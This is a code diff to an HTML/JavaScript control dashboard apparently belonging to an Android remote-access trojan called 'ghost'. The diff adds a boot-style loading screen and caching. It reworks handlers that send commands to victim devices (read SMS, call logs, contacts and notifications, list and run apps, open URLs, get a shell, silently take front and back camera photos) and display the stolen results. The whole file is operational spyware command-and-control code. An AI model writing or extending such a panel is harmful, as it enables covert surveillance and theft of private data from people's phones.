@@ -40,8 +40,95 @@
             background-image: radial-gradient(circle at 30% 20%, #2f130f 0%, #020000 100%);
         }
 
-        #main-app {
+        /* ---------- SYSTEM LOADER (SAME AS INDEX) ---------- */
+        .system-loader {
+            position: fixed;
+            inset: 0;
+            background: #080000;
+            z-index: 20000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            transition: opacity 0.5s ease;
+            background: linear-gradient(145deg, #130404, #020101);
+            border: 2px solid #6a1f1f;
+        }
+
+        .system-loader.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .boot-sequence {
+            width: 100%;
+            max-width: 400px;
+            background: #120808;
+            border: 2px solid #aa2b2b;
+            box-shadow: 0 0 40px #a83030;
+            padding: 24px 18px;
+            border-radius: 40px;
+            text-align: center;
+        }
+
+        .boot-logo {
+            width: 130px;
+            margin: 0 auto 15px;
+            filter: drop-shadow(0 0 20px #44ff88) drop-shadow(0 0 30px #ff3b3b);
+            animation: throb 2s infinite alternate;
+        }
+
+        .boot-logo img {
+            width: 100%;
+            height: auto;
             display: block;
+        }
+
+        .boot-text {
+            color: #f0ffd0;
+            font-size: 1.2rem;
+            letter-spacing: 3px;
+            font-weight: 300;
+            text-shadow: 0 0 8px #64ff9e, 0 0 12px #ff4f4f;
+            margin-bottom: 16px;
+        }
+
+        .boot-bar {
+            width: 100%;
+            height: 8px;
+            background: #2d1212;
+            border-radius: 20px;
+            border: 1px solid #aa3c3c;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .boot-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff3a3a, #6aff99, #ff3737);
+            box-shadow: 0 0 20px #5eff8c;
+            transition: width 0.3s ease;
+        }
+
+        .boot-status {
+            color: #9affb5;
+            font-family: monospace;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 5px;
+        }
+
+        @keyframes throb {
+            0% { filter: drop-shadow(0 0 5px #ff3b3b) drop-shadow(0 0 15px #5eff99); }
+            100% { filter: drop-shadow(0 0 25px #ff6565) drop-shadow(0 0 35px #5eff99); }
+        }
+
+        /* ---------- MAIN DASHBOARD ---------- */
+        #main-app {
+            display: none;
             width: 100%;
             max-width: 480px;
             margin: 0 auto;
@@ -271,6 +358,23 @@
     </style>
 </head>
 <body>
+    <!-- SYSTEM LOADING SCREEN (same as index) -->
+    <div id="systemLoader" class="system-loader">
+        <div class="boot-sequence">
+            <div class="boot-logo">
+                <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="ghost">
+            </div>
+            <div class="boot-text">DASHBOARD INIT</div>
+            <div class="boot-bar">
+                <div class="boot-fill" id="bootFill" style="width: 0%;"></div>
+            </div>
+            <div class="boot-status">
+                <span id="bootMsg">establishing link...</span>
+                <span id="bootPercent">0%</span>
+            </div>
+        </div>
+    </div>
+
 <div id="main-app">
     <div class="app-container">
         <header class="panel header">
@@ -309,6 +413,38 @@
 
 <script>
     (function() {
+        // ---------- LOADING SCREEN SIMULATION ----------
+        const loader = document.getElementById('systemLoader');
+        const bootFill = document.getElementById('bootFill');
+        const bootMsg = document.getElementById('bootMsg');
+        const bootPercent = document.getElementById('bootPercent');
+        
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 4;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                bootMsg.innerText = '>> READY <<';
+                bootPercent.innerText = '100%';
+                bootFill.style.width = '100%';
+                
+                // Hide loader after a short pause
+                setTimeout(() => {
+                    loader.classList.add('fade-out');
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                    }, 500);
+                }, 400);
+            }
+            bootFill.style.width = progress + '%';
+            bootPercent.innerText = progress + '%';
+            
+            if (progress < 30) bootMsg.innerText = 'establishing link...';
+            else if (progress < 70) bootMsg.innerText = 'loading modules';
+            else bootMsg.innerText = 'finalizing';
+        }, 40);
+
         // ---------- AUTH CHECK ----------
         const uid = localStorage.getItem('ghost_uid');
         if (!uid) {
@@ -317,13 +453,13 @@
         }
         document.getElementById('user-display').innerText = uid;
 
-        // ---------- STATE (no dummy data) ----------
-        let devices = [];               // will be filled by poll
+        // ---------- STATE ----------
+        let devices = [];
         let selectedDeviceId = null;
         let flashState = false;
         let curMod = null;
         let termOutput = '';
-        let cache = {};                 // cache per device untuk data modal
+        let cache = {};                 // cache data per device from /api/data
 
         // UI elements
         const deviceListEl = document.getElementById('device-list');
@@ -331,27 +467,41 @@
         const connStatEl = document.getElementById('conn-stat');
         const mainGridEl = document.getElementById('main-grid');
 
-        // ---------- REAL-TIME DEVICE POLLING ----------
+        // ---------- REAL DEVICE POLLING (from /api/status) ----------
         async function pollDevices() {
             try {
                 const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
                 if (!res.ok) throw new Error('poll failed');
                 const data = await res.json();
-                // data.devices MUST be array of { id, model, man, ver, bat, ... }
                 devices = data.devices || [];
                 renderDeviceList();
 
-                // if selected device disappeared, reset
                 if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
                     selectedDeviceId = null;
                     updateSelection();
                 }
+                // also update cache for selected device if needed
+                if (selectedDeviceId) fetchDeviceData(selectedDeviceId);
             } catch (e) {
                 console.warn('poll error', e);
                 devices = [];
                 renderDeviceList();
             }
             setTimeout(pollDevices, 3000);
+        }
+
+        // fetch full data for a device (used by modal)
+        async function fetchDeviceData(devId) {
+            try {
+                const res = await fetch(`/api/data/${devId}`);
+                if (!res.ok) return;
+                const data = await res.json();
+                cache[devId] = data;
+                // if modal open for this device, refresh
+                if (curMod && selectedDeviceId === devId) {
+                    refreshModalFromCache();
+                }
+            } catch (e) {}
         }
 
         function renderDeviceList() {
@@ -371,6 +521,7 @@
             selectedDeviceId = id;
             renderDeviceList();
             updateSelection();
+            fetchDeviceData(id); // preload
         };
 
         function updateSelection() {
@@ -386,7 +537,7 @@
             renderMainButtons();
         }
 
-        // ---------- MAIN BUTTON GRID ----------
+        // ---------- BUTTON GRID ----------
         function renderMainButtons() {
             const btns = [
                 { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
@@ -420,7 +571,7 @@
             }).catch(e => console.warn('cmd error', e));
         };
 
-        // ---------- MODAL HANDLER (real data) ----------
+        // ---------- MODAL: open & populate from cache ----------
         window.openModal = (t) => {
             if (!selectedDeviceId) return;
             curMod = t;
@@ -430,6 +581,17 @@
             const foot = document.getElementById('modal-footer');
             body.innerHTML = ''; foot.innerHTML = '';
 
+            // if we have cached data, show it immediately, then refresh
+            if (cache[selectedDeviceId]) {
+                renderModalFromCache(t);
+            } else {
+                body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
+            }
+
+            // always send command to get fresh data
+            sendCommandForModal(t);
+
+            // specific UI for some modules
             if (t === 'filemanager') {
                 termOutput = 'ghost@android:~#\n';
                 body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
@@ -466,70 +628,87 @@
                 foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
             }
             else {
-                // All data modules: show loading then send command
-                body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
-                foot.innerHTML = `<button onclick="cmd('${mapCmd(t)}')">REFRESH</button>`;
-                cmd(mapCmd(t));
-            }
-
-            function mapCmd(modalType) {
-                const map = {
-                    sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
-                    notifications: 'getnotifications', info: 'deviceinfo',
-                    gallery: 'gallery', apps: 'list_app',
-                    takebackpic: 'takebackpic', takefrontpic: 'takefrontpic'
-                };
-                return map[modalType] || modalType;
+                // add refresh button for data modules
+                foot.innerHTML = `<button onclick="sendCommandForModal('${t}')">REFRESH</button>`;
             }
         };
 
-        // ---------- UPDATE MODAL WITH REAL DATA ----------
-        window.updateModalData = function(type, data) {
-            if (curMod !== type) return;
+        function sendCommandForModal(t) {
+            const cmdMap = {
+                sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
+                notifications: 'getnotifications', info: 'deviceinfo',
+                gallery: 'gallery', apps: 'list_app',
+                takebackpic: 'takebackpic', takefrontpic: 'takefrontpic',
+                filemanager: 'filemanager'
+            };
+            const command = cmdMap[t] || t;
+            if (command) cmd(command);
+        }
+
+        function renderModalFromCache(t) {
+            const data = cache[selectedDeviceId];
+            if (!data) return;
             const body = document.getElementById('modal-body');
             if (!body) return;
 
-            if (type === 'sms') {
+            if (t === 'sms') {
+                const smsList = data.sms || [];
                 body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
-                    (data || []).map(s => `<tr><td>${s.userSender || '?'}</td><td>${s.content || ''}</td></tr>`).join('')
+                    smsList.map(s => `<tr><td>${s.userSender || s.address || '?'}</td><td>${s.content || s.body || ''}</td></tr>`).join('')
                 }</table>`;
             }
-            else if (type === 'calls') {
+            else if (t === 'calls') {
+                const callsList = data.calls || [];
                 body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
-                    (data || []).map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
+                    callsList.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
                 }</table>`;
             }
-            else if (type === 'contacts') {
+            else if (t === 'contacts') {
+                const contactsList = data.contacts || [];
                 body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
-                    (data || []).map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
+                    contactsList.map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
                 }</table>`;
             }
-            else if (type === 'notifications') {
+            else if (t === 'notifications') {
+                const notifList = data.notifications || [];
                 body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
-                    (data || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')
+                    notifList.map(n => `<tr><td>${n.packageName || n.app}</td><td>${n.title ? n.title+': ' : ''}${n.text || ''}</td></tr>`).join('')
                 }</table>`;
             }
-            else if (type === 'info') {
-                const i = data || {};
+            else if (t === 'info') {
+                const i = data.info || {};
                 body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
             }
-            else if (type === 'gallery') {
-                if (data && data.files) {
-                    body.innerHTML = `<div class="gal-grid">${
-                        data.files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
-                    }</div>`;
-                } else {
-                    body.innerHTML = '<p>no images</p>';
-                }
-            }
-            else if (type === 'apps') {
+            else if (t === 'apps') {
+                const appsList = data.apps || [];
                 body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
-                    (data || []).map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
+                    appsList.map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
                 }</table>`;
             }
-            else if (type === 'filemanager') {
-                // handled separately via terminal
+            else if (t === 'gallery') {
+                const gal = data.gallery || {};
+                const files = gal.files || [];
+                body.innerHTML = `<div class="gal-grid">${
+                    files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
+                }</div>`;
             }
+            else if (t === 'takebackpic' || t === 'takefrontpic') {
+                const media = data.media || {};
+                if (media.last_img) {
+                    if (media.is_direct) {
+                        body.innerHTML = `<img src="data:image/jpeg;base64,${media.last_img}" style="width:100%; border-radius:16px;" />`;
+                    } else {
+                        body.innerHTML = `<img src="/captured_images/${media.last_img}" style="width:100%; border-radius:16px;" />`;
+                    }
+                } else {
+                    body.innerHTML = '<p>no image yet</p>';
+                }
+            }
+        }
+
+        // called after new data arrives
+        window.refreshModalFromCache = function() {
+            if (curMod) renderModalFromCache(curMod);
         };
 
         // ---------- UTILS ----------
@@ -550,12 +729,13 @@
             curMod = null;
         };
 
+        // UPDATED: logout redirects to root "/"
         window.logout = () => {
             localStorage.removeItem('ghost_uid');
             window.location.href = '/';
         };
 
-        // mock functions (can be replaced with real implementations)
+        // stub functions for voice/wallpaper
         window.startMockRec = window.startMockRec || function() {};
         window.stopMockRec = window.stopMockRec || function() {};
         window.uploadWall = window.uploadWall || function() {};
@@ -564,8 +744,12 @@
         updateSelection();
         pollDevices();
 
-        // expose for server push (optional)
-        window.receiveModalData = window.updateModalData;
+        // expose for possible updates from server push (if implemented)
+        window.receiveModalData = function(type, data) {
+            if (curMod === type) {
+                renderModalFromCache(curMod);
+            }
+        };
     })();
 </script>
 </body>
